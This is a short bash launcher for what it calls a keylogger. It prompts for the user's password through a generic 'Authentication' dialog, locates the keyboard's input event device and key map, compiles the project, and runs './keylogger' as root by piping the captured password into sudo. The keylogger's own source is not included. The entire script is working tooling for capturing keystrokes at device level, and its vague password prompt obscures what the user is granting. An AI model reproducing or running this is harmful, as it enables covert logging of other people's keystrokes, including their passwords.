#! /bin/bash

password=$(zenity --password --title=Authentication)"\n\n\n"
whoami=$(whoami)

echo $whoami
keyboards=$(cat /proc/bus/input/devices | grep -A 7 keyboard)
#TODO clean sed command
echo $keyboards
eventfile=$(echo $keyboards | grep "H: " | sed -n 's/^.*\(event[^ ]*\).*/\1/p')
echo "event: "$eventfile
keyMap=$(xmodmap -pke | awk  '{printf substr($0, index($0, $3))"|\n"}' | cut -c3- )
echo  $keyMap
#echo $keyMap | awk '{print "\""$0"\""}' | echo $@ 
make re
if [ $? -ne 0 ]
then
echo -e "MAKE FAILED\n"
exit 0 
fi
echo -e $password | sudo -S ./keylogger "/dev/input/$eventfile" "${keyMap//[$'\t\r\n']}"
echo $?
#TODO loop on $? for retry